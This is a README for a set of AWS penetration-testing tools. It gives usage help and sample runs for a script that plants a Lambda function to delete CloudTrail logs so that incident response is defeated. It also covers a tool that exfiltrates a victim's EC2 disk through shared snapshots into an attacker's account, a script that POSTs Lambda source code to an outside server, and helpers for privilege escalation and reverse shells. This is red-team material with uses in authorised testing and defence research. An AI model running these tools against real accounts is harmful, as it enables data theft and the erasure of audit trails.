
## AWS-related penetration testing scripts, tools and Cheatsheets


- **`assume-role-helper.sh`** - Calls `aws sts assume-role` using MFA token in order to retrieve session credentials and reformat it into `~/.aws/credentials` file format. That eases copy-and-paste of credentials provided by Assume Role facility into credentials file format. Having creds reformatted, tools such as _s3tk_ that are unable to process MFA tokens could be used using preconfigured profile creds. 

- **`disruptCloudTrailByS3Lambda.py`** - This script attempts to disrupt CloudTrail by planting a Lambda function that will delete every object created in S3 bucket bound to a trail. As soon as CloudTrail creates a new object in S3 bucket, Lambda will kick in and delete that object. No object, no logs. No logs, no Incident Response :-)

One will need to pass AWS credentials to this tool. Also, the account affected should have at least following permissions:
- `iam:CreateRole`
- `iam:CreatePolicy`
- `iam:AttachRolePolicy`
- `lambda:CreateFunction`
- `lambda:AddPermission`
- `s3:PutBucketNotification`

These are the changes to be introduced within a specified AWS account:
- IAM role will be created, by default with name: `cloudtrail_helper_role`
- IAM policy will be created, by default with name: `cloudtrail_helper_policy`
- Lambda function will be created, by default with name: `cloudtrail_helper_function`
- Put Event notification will be configured on affected CloudTrail S3 buckets.

This tool will fail upon first execution with the following exception:

```
[-] Could not create a Lambda function: An error occurred (InvalidParameterValueException) when calling the CreateFunction operation: The role defined for the function cannot be assumed by Lambda.
```

At the moment I did not find an explanation for that, but running the tool again with the same set of parameters - get the job done.

```
bash $ python3 disruptCloudTrailByS3Lambda.py --help

        :: AWS CloudTrail disruption via S3 Put notification to Lambda
        Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>

usage: disruptCloudTrailByS3Lambda.py [options] <region> [trail_name]

required arguments:
  region                AWS region to use.
  --access-key ACCESS_KEY
                        AWS Access Key ID
  --secret-key SECRET_KEY
                        AWS Access Key ID
  --token TOKEN         AWS temporary session token

optional arguments:
  trail_name            CloudTrail name that you want to disrupt. If not
                        specified, will disrupt every actively logging trail.
  --disrupt             By default, this tool will install Lambda that is only
                        logging that it could remove S3 objects. By using this
                        switch, there is going to be Lambda introduced that
                        actually deletes objects.
  --role-name ROLE_NAME
                        name for AWS Lambda role
  --policy-name POLICY_NAME
                        name for a policy for that Lambda role
  --function-name FUNCTION_NAME
                        name for AWS Lambda function


bash $ python3 disruptCloudTrailByS3Lambda.py --access-key ASIAXXXXXXXXXXXXXXXX --secret-key Gaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa --token FQoGZX[...] us-west-2

        :: AWS CloudTrail disruption via S3 Put notification to Lambda
        Disrupts AWS CloudTrail logging by planting Lambda that deletes S3 objects upon their creation
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>

[.] Will be working on Account ID: 712800000000
[.] Step 1: Determine trail to disrupt
[+] Trail cloudgoat_trail is actively logging (multi region? No).
[.] Trails intended to be disrupted:
	- cloudgoat_trail

[.] Step 2: Create a role to be assumed by planted Lambda
[-] Role with name: cloudtrail_helper_role already exists.
[.] Step 3: Create a policy for that role
[-] Policy with name: cloudtrail_helper_policy already exists.
[.] Step 4: Attach policy to the role
[.] Attaching policy (arn:aws:iam::712800000000:policy/cloudtrail_helper_policy) to the role cloudtrail_helper_role
[-] Policy is already attached.
[.] Step 5: Create Lambda function
[.] 	Using non-disruptive lambda.
[.] Creating a lambda function named: cloudtrail_helper_function on Role: arn:aws:iam::712800000000:role/cloudtrail_helper_role
[+] Function created.
[.] Step 6: Permit function to be invoked on all trails
[.] Adding invoke permission to func: cloudtrail_helper_function on S3 bucket: arn:aws:s3:::90112981864022885796153088027941100000000000000000000000
[.] Step 7: Configure trail bucket's put notification
[.] Putting a bucket notification configuration to 90112981864022885796153088027941100000000000000000000000, ARN: arn:aws:lambda:us-west-2:712800000000:function:cloudtrail_helper_function
[+] Installed CloudTrail's S3 bucket disruption Lambda.
```

Afterwards, one should see following logs in CloudWatch traces for planted Lambda function - if no `--disrupt` option was specified:

```
[*] Following S3 object could be removed: (Bucket=90112981864022885796153088027941100000000000000000000000, Key=cloudtrail/AWSLogs/712800000000/CloudTrail/us-west-2/2019/03/20/712800000000_CloudTrail_us-west-2_20190320T1000Z_oxxxxxxxxxxxxc.json.gz)
```

- **`evaluate-iam-role.sh`** - Enumerates attached IAM Role policies or specified Policy by it's Arn, goes through all of granted permissions and lists those that are known for Privilege Escalation or other risks. If `all` was specified as a role-name, the tool will evaluate all of the user-specified IAM Roles, iteratively. Based on [Rhino Security Labs work](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/). [gist](https://gist.github.com/mgeeky/14685d94af7848e64afefe6fd2341a18)

```
attacker $ ./evaluate-iam-role.sh awl CustomSysOpsRole
[+] Working on specified Role: CustomSysOpsRole

[+] Role (CustomSysOpsRole) has following policies attached:
	- arn:aws:iam::aws:policy/AmazonRDSFullAccess
	- arn:aws:iam::aws:policy/AmazonEC2FullAccess
	- arn:aws:iam::aws:policy/AWSLambdaFullAccess
	- arn:aws:iam::aws:policy/AmazonS3FullAccess
	- arn:aws:iam::aws:policy/ReadOnlyAccess
	- arn:aws:iam::aws:policy/AmazonSSMFullAccess
	- arn:aws:iam::aws:policy/AmazonMQFullAccess
	- arn:aws:iam::aws:policy/AWSBackupAdminPolicy


[+] =============== Permissions granted ===============

	a4b:Describe*
	a4b:Get*
	a4b:List*
	a4b:Search*
	acm:Describe*
	acm:DescribeCertificate
	acm:Get*
	acm:List*
	[...]
	workdocs:Get*
	worklink:Describe*
	worklink:List*
	workmail:Describe*
	workmail:Get*
	workmail:List*
	workmail:Search*
	workspaces:Describe*
	xray:BatchGet*
	xray:Get*
	xray:PutTelemetryRecords
	xray:PutTraceSegments


[-] =============== Detected POTENTIALLY dangerous permissions granted ===============

	[...]
	backup:*
	backup-storage:*
	clouddirectory:BatchRead
	cloudformation:*
	cloudformation:CreateStack
	[...]
	iot:CreateThing
	iot:CreateTopicRule
	sns:*
	sqs:*
	sqs:SendMessage
	ssm:*
	ssmmessages:CreateControlChannel
	ssmmessages:CreateDataChannel
	support:*
	xray:BatchGet*
	xray:PutTelemetryRecords
	xray:PutTraceSegments


[!] =============== Detected DANGEROUS permissions granted ===============

	cloudformation:CreateStack
	iam:AttachRolePolicy
	iam:PassRole

```

- **`exfiltrate-ec2.py`** - This script exploits insecure permissions given to the EC2 IAM Role allowing to exfiltrate target EC2's filesystem data in a form of it's shared EBS snapshot or publicly exposed AMI image.

IAM Permissions abused:
- `ec2:CreateSnapshot`
- `ec2:ModifySnapshotAttribute`
- `ec2:CreateImage`

```
attacker $ python3 ./exfiltrate-ec2.py --help

        :: exfiltrate-ec2
        Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>

usage: ./exfiltrate-ec2.py [-h] [--region REGION] [--profile PROFILE]
                           [--access-key ACCESS_KEY] [--secret-key SECRET_KEY]
                           [--token TOKEN] [--victim-profile VICTIM_PROFILE]
                           [--victim-access-key VICTIM_ACCESS_KEY]
                           [--victim-secret-key VICTIM_SECRET_KEY]
                           [--victim-token VICTIM_TOKEN] [-v]
                           {createimage,createsnapshot} ...

positional arguments:
  {createimage,createsnapshot}
                        Available methods
    createimage         Creates a snapshot of a running or stopped EC2
                        instance in an AMI image form. This AMI image will
                        then be shared with another AWS account, constituing
                        exfiltration opportunity.
    createsnapshot      Creates a snapshot of an EBS volume used by an EC2
                        instance. This snapshot will then be shared with
                        another AWS account, constituing exfiltration
                        opportunity.

required arguments:
  --region REGION       AWS Region to use.

optional arguments:
  -v, --verbose         Display verbose output.

Attacker's AWS credentials - where to instantiate exfiltrated EC2:
  --profile PROFILE     Attacker's AWS Profile name to use if --access-key was
                        not specified
  --access-key ACCESS_KEY
                        Attacker's AWS Access Key ID to use if --profile was
                        not specified
  --secret-key SECRET_KEY
                        Attacker's AWS Secret Key ID
  --token TOKEN         (Optional) Attacker's AWS temporary session token

Victim AWS credentials - where to find EC2 to exfiltrate:
  --victim-profile VICTIM_PROFILE
                        Victim's AWS Profile name to use if --access-key was
                        not specified
  --victim-access-key VICTIM_ACCESS_KEY
                        Victim's AWS Access Key ID to use if --profile was not
                        specified
  --victim-secret-key VICTIM_SECRET_KEY
                        Victim's AWS Secret Key ID
  --victim-token VICTIM_TOKEN
                        (Optional) Victim's AWS temporary session token


attacker $ python3 ./exfiltrate-ec2.py --region us-east-1 -v --profile default --victim-profile victim-profile createsnapshot --volume-id vol-0f340890acfXXXXX --attach-instance-id i-0b359b0fcbcYYYYY

        :: exfiltrate-ec2
        Exfiltrates EC2 data by creating an image of it or snapshot of it's EBS volume
        Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>

[.] Using attacker's profile: default
[.] Using victim's profile: victim-profile
[.] Using region: us-east-1
[.] Authenticating using Attacker's AWS credentials...
[.] Authenticating using Victim's AWS credentials...
[>] Abusing dangerous ec2:CreateSnapshot and ec2:ModifySnapshotAttribute...

[>] Step 1: Creating EBS volume snapshot. VolumeId = vol-0f340890acfXXXXX
[+] Snapshot of volume vol-0f340890acfXXXXX created: snap-0d7a43f0ff34ZZZZ
[>] Step 2: Modifying snapshot attributes to share it with UserId = 71284700000
[+] Snapshot's attributes modified to share it with user 71284700000
[>] Step 3: Waiting for the snapshot to transit into completed state.
[>] Step 4: Creating EBS volume in Attacker's 71284700000 AWS account.
[.] Obtained Attacker's EC2 instance Availbility Zone automatically: us-east-1d
[+] Created EBS volume (vol-04f36e35abeWWW at Attacker's side out from exfiltrated snapshot (snap-0d7a43f0ff34ZZZZ)
[>] Step 5: Waiting for the volume to transit into created state.
[>] Step 6: Attaching created EBS volume to Attacker's specified EC2 instance
[-] Attacker's machine is in running state, preventing to attach it a volume.
[.] Trying to stop the EC2 instance, then attach the volume and then restart it.
[+] Attached volume to the specified Attacker's EC2 instance: i-0b359b0fcbcYYYYY
[.] Restarting it...

===============================================================
[MODULE FINISHED]
===============================================================

[+] Exfiltrated snapshot of a victim's EBS volume:
    VictimVolumeId = vol-0f340890acfXXXXX

[+] By creating a snapshot of it, shared to the attacker's AWS user ID.
    SnapshotId = snap-0d7a43f0ff34ZZZZ

If everything went fine, Attacker's AWS account 71284700000 should have a EBS volume now:
    AttackerVolumeId = vol-04f36e35abeWWW

That was attached to the specified attacker's EC2 instance:
    AttackerInstanceId = i-0b359b0fcbcYYYYY
    AvailibityZone = us-east-1d

Most likely as a '/dev/xvdf' device. 

===============================================================
To examine exfiltrated data:

    0) SSH to the attacker's EC2 instance
        # ssh ec2-user@18.206.230.190

    1) List block devices mapped:
        # lsblk
    
    2) If above listing yielded mapped block device, e.g. xvdf, create a directory for it:
        # mkdir /exfiltrated

    3) Mount that device's volume:
        # mount /dev/xvdf1 /exfiltrated

attacker $ ssh ec2-user@18.206.230.190
[...]
ec2-user@ec2instance:~$ sudo -s
root@ec2instance:/home/ec2-user# lsblk
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0  25G  0 disk 
└─xvda1 202:1    0  25G  0 part 
xvdf    202:80   0  25G  0 disk 
└─xvdf1 202:81   0  25G  0 part /
root@ec2instance:/home/ec2-user# mkdir /exfiltrated
root@ec2instance:/home/ec2-user# mount /dev/xvda1 /exfiltrated
root@ec2instance:/home/ec2-user# ls -l /exfiltrated
total 84
-rw-r--r--   1 root root     0 lip 31  2018 0
lrwxrwxrwx   1 root root     7 sie 17  2018 bin -> usr/bin
drwxr-xr-x   3 root root  4096 sie 17  2018 boot
drwxr-xr-x   4 root root  4096 sie 17  2018 dev
drwxr-xr-x 179 root root 12288 gru  4 16:37 etc
drwxr-xr-x   3 root root  4096 lis  4 16:18 home
[...]
```

- **`exfiltrateLambdaTasksDirectory.py`** - Script that creates an in-memory ZIP file from the entire directory `$LAMBDA_TASK_ROOT` (typically `/var/task`) and sends it out in a form of HTTP(S) POST request, within an `exfil` parameter. To be used for exfiltrating AWS Lambda's entire source code.

- **`find-exposed-resources.sh`** - Utterly simple script enumerating some of the resources that could be publicly shared which would count as a security misconfiguration.

- **`identifyS3Bucket.rb`** - This script attempts to identify passed name whether it resolves to a valid AWS S3 Bucket via different means. This script may come handy when revealing S3 buckets hidden behind HTTP proxies.

- **`pentest-ec2-instance`** - A set of utilities for quick starting, ssh-ing and stopping of a single temporary EC2 instance intended to be used for Web out-of-band tests (SSRF, reverse-shells, dns/http/other daemons).

